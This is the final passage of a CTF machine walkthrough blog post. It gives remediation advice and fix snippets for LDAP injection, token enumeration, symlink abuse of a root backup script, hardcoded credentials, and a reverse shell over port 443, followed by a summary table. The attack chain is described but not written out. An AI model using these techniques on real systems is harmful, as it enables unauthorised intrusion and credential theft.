style=color:#e6db74>&#34;dc=example,dc=com&#34;</span>, <span style=color:#e6db74>&#34;(uid=</span><span style=color:#e6db74>$username</span><span style=color:#e6db74>)&#34;</span>);
</span></span><span style=display:flex><span>$entries <span style=color:#f92672>=</span> <span style=color:#a6e22e>ldap_get_entries</span>($ldap_conn, $result);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($entries[<span style=color:#e6db74>&#39;count&#39;</span>] <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>in_array</span>(<span style=color:#e6db74>&#39;ADM&#39;</span>, $entries[<span style=color:#ae81ff>0</span>][<span style=color:#e6db74>&#39;memberOf&#39;</span>]) <span style=color:#f92672>||</span> <span style=color:#a6e22e>in_array</span>(<span style=color:#e6db74>&#39;root&#39;</span>, $entries[<span style=color:#ae81ff>0</span>][<span style=color:#e6db74>&#39;memberOf&#39;</span>])) {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Proceed with authentication
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Unauthorized user.&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Configure the LDAP server to reject queries containing null bytes or malformed structures.</li><li>Disable anonymous binds unless necessary and enforce strong authentication for LDAP queries.</li><li>Example (OpenLDAP <code>slapd.conf</code>):<pre tabindex=0><code class=language-conf data-lang=conf>disallow bind_anon
require authc
</code></pre></li></ul></li></ul></li><li><strong>Additional Note</strong>: Log and monitor LDAP queries for suspicious patterns (e.g., null bytes, wildcards).</li></ul><h4 id=gap-5-exposure-of-sensitive-attributes>Gap 5: Exposure of Sensitive Attributes<a href=#gap-5-exposure-of-sensitive-attributes class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The LDAP server allows enumeration of attributes (e.g., <code>pager</code>, <code>password</code>) via injection, exposing sensitive data like the 81-digit token.</li><li><strong>Impact</strong>: Enabled brute-forcing of the token stored in the <code>pager</code> attribute.</li><li><strong>Fix Type</strong>: Configuration Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Restrict Attribute Access</strong>: Configure LDAP Access Control Lists (ACLs) to limit which attributes can be queried by authenticated users, especially sensitive ones like <code>pager</code> or <code>password</code>.</li><li><strong>Example</strong> (OpenLDAP <code>slapd.conf</code>):<pre tabindex=0><code class=language-conf data-lang=conf>access to attrs=pager,password
    by self read
    by * none
access to *
    by users read
    by * none
</code></pre></li><li><strong>Audit Attributes</strong>: Remove unused or unnecessary attributes (e.g., <code>pager</code> for token storage) or use a dedicated field with restricted access.</li></ul></li></ul><h3 id=3-token-authentication-system>3. Token Authentication System<a href=#3-token-authentication-system class=hanchor arialabel=Anchor>#</a></h3><h4 id=gap-6-weak-token-storage>Gap 6: Weak Token Storage<a href=#gap-6-weak-token-storage class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The 81-digit token is stored in the <code>pager</code> attribute, which is an unconventional and insecure choice, and the application allows brute-forcing of token digits via LDAP injection.</li><li><strong>Impact</strong>: Enabled enumeration of the full token, which was used to generate valid OTPs.</li><li><strong>Fix Type</strong>: Source Code Fix and Configuration Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Source Code Fix</strong>:<ul><li>Store tokens in a secure, encrypted database or dedicated token management system instead of LDAP attributes.</li><li>Example (PHP with secure storage):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$token <span style=color:#f92672>=</span> <span style=color:#a6e22e>hash_hmac</span>(<span style=color:#e6db74>&#39;sha256&#39;</span>, $user_id <span style=color:#f92672>.</span> <span style=color:#a6e22e>time</span>(), <span style=color:#e6db74>&#39;secret_key&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#75715e>// Store $token in a secure database, not LDAP
</span></span></span></code></pre></div></li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Use a dedicated token management solution (e.g., RSA SecurID server) with proper encryption and access controls.</li><li>If LDAP must be used, encrypt sensitive attributes and restrict access as described in Gap 5.</li></ul></li></ul></li></ul><h4 id=gap-7-time-synchronization-issues>Gap 7: Time Synchronization Issues<a href=#gap-7-time-synchronization-issues class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The token validation relies on server time, and the server exposes its time in HTTP headers, allowing attackers to synchronize their system time to generate valid OTPs.</li><li><strong>Impact</strong>: Enabled generation of valid OTPs using <code>stoken</code> by aligning client time with the server.</li><li><strong>Fix Type</strong>: Configuration Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Hide Server Time</strong>: Configure the web server to remove or obfuscate time-related headers (e.g., <code>Date</code> header).<ul><li>Example (Apache <code>httpd.conf</code>):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-apache data-lang=apache><span style=display:flex><span>Header unset Date
</span></span></code></pre></div></li></ul></li><li><strong>Enforce Strict Time Checks</strong>: Implement server-side validation to detect significant time discrepancies in token submissions.</li><li><strong>Use Secure Token Protocols</strong>: Adopt time-based OTP algorithms (e.g., TOTP) with short validity windows and secure synchronization mechanisms.</li></ul></li></ul><h3 id=4-backup-script-cron-job>4. Backup Script (Cron Job)<a href=#4-backup-script-cron-job class=hanchor arialabel=Anchor>#</a></h3><h4 id=gap-8-insecure-backup-script>Gap 8: Insecure Backup Script<a href=#gap-8-insecure-backup-script class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The <code>honeypot.sh</code> script runs as root, uses relative paths, and processes user-controlled files in <code>/var/www/html/uploads</code> without validation, allowing symbolic link attacks to read privileged files like <code>/root/root.txt</code>.</li><li><strong>Impact</strong>: Enabled reading of <code>root.txt</code> by creating a symbolic link that the script attempted to archive, exposing the file&rsquo;s contents in an error log.</li><li><strong>Fix Type</strong>: Source Code Fix and Configuration Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Source Code Fix</strong>:<ul><li>Validate and sanitize file paths in the backup script to prevent symbolic link attacks.</li><li>Use absolute paths for all commands (e.g., <code>/usr/bin/date</code> instead of <code>date</code>).</li><li>Example (Bash):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>for</span> file in /var/www/html/uploads/*; <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> -L <span style=color:#e6db74>&#34;</span>$file<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Symbolic links not allowed&#34;</span> &gt;&amp;<span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>    /usr/bin/7z a -t7z -snl -p<span style=color:#e6db74>&#34;</span>$PASSWORD<span style=color:#e6db74>&#34;</span> /backup/backup.7z <span style=color:#e6db74>&#34;</span>$file<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
</span></span></code></pre></div></li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Restrict permissions on <code>/var/www/html/uploads</code> to prevent the <code>apache</code> user from creating files.</li><li>Example (Linux):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chown root:root /var/www/html/uploads
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>755</span> /var/www/html/uploads
</span></span></code></pre></div></li><li>Run the backup script as a less privileged user instead of root to limit the impact of exploitation.</li><li>Example (Cron configuration):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>* * * * * backup_user /path/to/honeypot.sh
</span></span></code></pre></div></li></ul></li></ul></li></ul><h4 id=gap-9-error-log-exposure>Gap 9: Error Log Exposure<a href=#gap-9-error-log-exposure class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The backup script writes errors (including file contents from failed archive attempts) to a log file accessible by the <code>apache</code> user, exposing sensitive data like the <code>root.txt</code> hash.</li><li><strong>Impact</strong>: Allowed attackers to read the root flag from the error log.</li><li><strong>Fix Type</strong>: Configuration Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Restrict Log Access</strong>: Ensure error logs are not readable by the <code>apache</code> user.<ul><li>Example (Linux):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chown root:root /var/log/error.log
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> /var/log/error.log
</span></span></code></pre></div></li></ul></li><li><strong>Redirect Errors Securely</strong>: Modify the script to redirect errors to a secure location or suppress sensitive output.<ul><li>Example (Bash):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/usr/bin/7z a -t7z -snl -p<span style=color:#e6db74>&#34;</span>$PASSWORD<span style=color:#e6db74>&#34;</span> /backup/backup.7z @/var/www/html/uploads/list.txt 2&gt;/dev/null
</span></span></code></pre></div></li></ul></li></ul></li></ul><h3 id=5-ssh-service>5. SSH Service<a href=#5-ssh-service class=hanchor arialabel=Anchor>#</a></h3><h4 id=gap-10-exposed-ldap-credentials>Gap 10: Exposed LDAP Credentials<a href=#gap-10-exposed-ldap-credentials class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The <code>login.php</code> file contains hardcoded LDAP bind credentials (<code>LDAPuser</code> and password), which are accessible to the <code>apache</code> user and can be used to SSH into the system.</li><li><strong>Impact</strong>: Allowed attackers to gain SSH access as <code>LDAPuser</code>.</li><li><strong>Fix Type</strong>: Source Code Fix and Configuration Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Source Code Fix</strong>:<ul><li>Remove hardcoded credentials from <code>login.php</code> and use environment variables or a secure credential management system.</li><li>Example (PHP with environment variables):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$ldap_user <span style=color:#f92672>=</span> <span style=color:#a6e22e>getenv</span>(<span style=color:#e6db74>&#39;LDAP_USER&#39;</span>);
</span></span><span style=display:flex><span>$ldap_pass <span style=color:#f92672>=</span> <span style=color:#a6e22e>getenv</span>(<span style=color:#e6db74>&#39;LDAP_PASS&#39;</span>);
</span></span></code></pre></div></li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Restrict read access to <code>login.php</code> to prevent the <code>apache</code> user from accessing it.<ul><li>Example (Linux):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chown root:root /var/www/html/login.php
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> /var/www/html/login.php
</span></span></code></pre></div></li></ul></li><li>Disable password-based SSH authentication for <code>LDAPuser</code> and enforce key-based authentication.<ul><li>Example (SSH <code>sshd_config</code>):<pre tabindex=0><code class=language-conf data-lang=conf>PasswordAuthentication no
AuthorizedKeysFile .ssh/authorized_keys
</code></pre></li></ul></li></ul></li></ul></li></ul><h3 id=6-general-system-configuration>6. General System Configuration<a href=#6-general-system-configuration class=hanchor arialabel=Anchor>#</a></h3><h4 id=gap-11-apache-user-permissions>Gap 11: Apache User Permissions<a href=#gap-11-apache-user-permissions class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The <code>apache</code> user has write access to <code>/var/www/html/uploads</code>, enabling file creation and symbolic link attacks.</li><li><strong>Impact</strong>: Facilitated the backup script exploit to read <code>root.txt</code>.</li><li><strong>Fix Type</strong>: Configuration Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Restrict Directory Permissions</strong>: Remove write permissions for the <code>apache</code> user on <code>/var/www/html/uploads</code>.<ul><li>Example (Linux):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chown root:root /var/www/html/uploads
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>755</span> /var/www/html/uploads
</span></span></code></pre></div></li></ul></li><li><strong>Use AppArmor/SELinux</strong>: Enforce mandatory access controls to restrict the <code>apache</code> user&rsquo;s actions.<ul><li>Example (SELinux):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>setsebool -P httpd_can_write_upload <span style=color:#ae81ff>0</span>
</span></span></code></pre></div></li></ul></li></ul></li></ul><h4 id=gap-12-firewall-misconfiguration>Gap 12: Firewall Misconfiguration<a href=#gap-12-firewall-misconfiguration class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The system allows outbound connections on port 443 but blocks others (e.g., 9001), indicating an inconsistent firewall policy that attackers can exploit by using allowed ports.</li><li><strong>Impact</strong>: Enabled reverse shell on port 443.</li><li><strong>Fix Type</strong>: Configuration Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Tighten Firewall Rules</strong>: Restrict outbound connections to only necessary ports and destinations.<ul><li>Example (iptables):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>iptables -A OUTPUT -p tcp --dport <span style=color:#ae81ff>443</span> -j DROP
</span></span><span style=display:flex><span>iptables -A OUTPUT -p tcp --dport <span style=color:#ae81ff>80</span> -j ACCEPT
</span></span></code></pre></div></li></ul></li><li><strong>Monitor Outbound Traffic</strong>: Implement logging to detect suspicious outbound connections.</li></ul></li></ul><h3 id=summary-of-fixes>Summary of Fixes<a href=#summary-of-fixes class=hanchor arialabel=Anchor>#</a></h3><table><thead><tr><th><strong>Service/System</strong></th><th><strong>Gap</strong></th><th><strong>Fix Type</strong></th><th><strong>Key Actions</strong></th></tr></thead><tbody><tr><td>Web Application</td><td>LDAP Injection</td><td>Source Code</td><td>Sanitize inputs, use parameterized queries</td></tr><tr><td>Web Application</td><td>Weak Brute-Force Protection</td><td>Source Code & Config</td><td>Rate-limiting, WAF, CAPTCHA</td></tr><tr><td>Web Application</td><td>Improper URL Encoding</td><td>Source Code</td><td>Consistent decoding, strict validation</td></tr><tr><td>LDAP Server</td><td>Permissive Queries</td><td>Source Code & Config</td><td>Validate query results, restrict anonymous binds</td></tr><tr><td>LDAP Server</td><td>Sensitive Attribute Exposure</td><td>Config</td><td>Restrict attribute access via ACLs</td></tr><tr><td>Token System</td><td>Weak Token Storage</td><td>Source Code & Config</td><td>Use secure storage, encryption</td></tr><tr><td>Token System</td><td>Time Sync Issues</td><td>Config</td><td>Hide server time, enforce strict time checks</td></tr><tr><td>Backup Script</td><td>Insecure Script</td><td>Source Code & Config</td><td>Validate paths, use absolute paths, restrict permissions</td></tr><tr><td>Backup Script</td><td>Error Log Exposure</td><td>Config</td><td>Restrict log access, suppress sensitive output</td></tr><tr><td>SSH Service</td><td>Exposed Credentials</td><td>Source Code & Config</td><td>Use environment variables, restrict file access, disable password auth</td></tr><tr><td>General System</td><td>Apache User Permissions</td><td>Config</td><td>Restrict directory permissions, use AppArmor/SELinux</td></tr><tr><td>General System</td><td>Firewall Misconfiguration</td><td>Config</td><td>Tighten outbound rules, monitor traffic</td></tr></tbody></table><p>These fixes address the vulnerabilities exploited in the CTF challenge, focusing on securing the web application, LDAP server, token system, backup script, SSH service, and overall system configuration to prevent similar attacks in a production environment.</p><h2 id=conclusion>Conclusion<a href=#conclusion class=hanchor arialabel=Anchor>#</a></h2><p>CTF is an excellent machine that demonstrates the complexity of LDAP-based authentication systems and the interconnected nature of web application vulnerabilities. It requires expertise in:</p><ul><li>LDAP injection techniques and attribute enumeration</li><li>Software token systems and OTP generation with stoken</li><li>Time synchronization attacks for token validation bypass</li><li>Python scripting for automated brute force attacks</li><li>Backup script exploitation through symbolic link manipulation</li><li>System enumeration and privilege escalation techniques</li></ul><p>The machine emphasizes the importance of proper input validation, secure authentication mechanisms, time-based security controls, and the principle of least privilege in system administration.</p><hr><p><em>This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.</em></p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>Â© 2025 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>